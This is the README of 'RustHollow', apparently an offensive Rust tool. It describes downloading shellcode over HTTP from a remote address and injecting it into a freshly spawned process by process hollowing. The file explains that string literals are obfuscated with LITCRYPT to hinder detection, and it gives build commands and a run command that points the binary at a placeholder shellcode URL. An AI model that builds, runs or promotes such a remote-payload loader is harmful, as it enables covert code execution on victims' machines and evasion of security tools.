# RustHollow

This tool will use HTTP to download a shellcode from a remote address and inject it in a newly spawned process by using the process hollowing technique.
Since we are using [LITCRYPT](https://github.com/anvie/litcrypt.rs) plugin to obfuscate string literals, it is required to set up the environment variable LITCRYPT_ENCRYPT_KEY before compiling the code:

	set LITCRYPT_ENCRYPT_KEY="yoursupersecretkey"

After that, simply compile the code and execute it:

	cargo build
	rust_hollow.exe http://yourip/yourshellcode.bin